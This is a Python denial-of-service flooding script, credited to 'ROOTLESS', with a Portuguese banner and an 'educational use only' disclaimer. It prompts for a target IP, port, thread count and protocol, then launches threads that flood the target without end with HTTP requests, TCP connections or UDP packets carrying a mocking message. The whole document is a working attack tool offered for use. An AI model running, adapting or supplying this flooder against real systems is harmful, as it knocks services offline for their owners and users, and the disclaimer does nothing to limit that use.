import socket
import requests
import threading
import os

os.system('clear')

RED = "\033[91m"
NEON_PURPLE = "\033[95m"
RESET = "\033[0m"

print(f"""\n
{RED}
   __  ___  _    ___  ___  ___ 
 | . |/ __>| |  | __>/ __>/ __>
 | | |\__ \| |_ | _> \__ \\__ \\
 `___'<___/|___||___><___/<___/
{RESET}
{NEON_PURPLE}
Autor: ROOTLESS
AVISO: Este código é fornecido apenas para fins educacionais. 
O autor não se responsabiliza por qualquer uso indevido ou 
atividades ilegais realizadas com este código. Use-o 
exclusivamente em ambientes controlados e com permissão.                          
{RESET}
\n""")

# Entrada do usuário para o alvo, porta e número de pacotes
alvo_ip = str(input("Insira o IP do Alvo: "))
alvo_port = int(input("Insira a porta: "))
numero = int(input("Número de pacotes: "))
protocolo = str(input("Protocolo (http, tcp, udp): ")).lower()

def attack_http():
    target_url = f"http://{alvo_ip}:{alvo_port}"
    while True:
        try:
            response = requests.get(target_url)
            print(f"{RED}[*]{RESET}{NEON_PURPLE} FAZ O ROOT, FAZ O LESS KKK || HTTP {RESET}")
        except requests.RequestException as e:
            print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} {e}{RESET}")

def attack_tcp():
    message = "FAZ O ROOT, FAZ O LESS KKK"
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((alvo_ip, alvo_port))
            client.sendall(message.encode())
            print(f"{RED}[*]{RESET}{NEON_PURPLE} FAZ O ROOT, FAZ O LESS KKK || TCP {RESET}")
            client.close()
        except Exception as e:
            print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} {e}{RESET}")

def attack_udp():
    message = b"FAZ O ROOT, FAZ O LESS KKK"
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client.sendto(message, (alvo_ip, alvo_port))
            print(f"{RED}[*]{RESET}{NEON_PURPLE} FAZ O ROOT, FAZ O LESS KKK || UDP {RESET}")
        except Exception as e:
            print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} {e}{RESET}")

# Número de threads
def start_attack():
    for _ in range(numero):
        if protocolo == 'http':
            thread = threading.Thread(target=attack_http)
        elif protocolo == 'tcp':
            thread = threading.Thread(target=attack_tcp)
        elif protocolo == 'udp':
            thread = threading.Thread(target=attack_udp)
        else:
            print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} Protocolo desconhecido: {protocolo}{RESET}")
            return
        thread.start()

# Iniciar ataque
start_attack()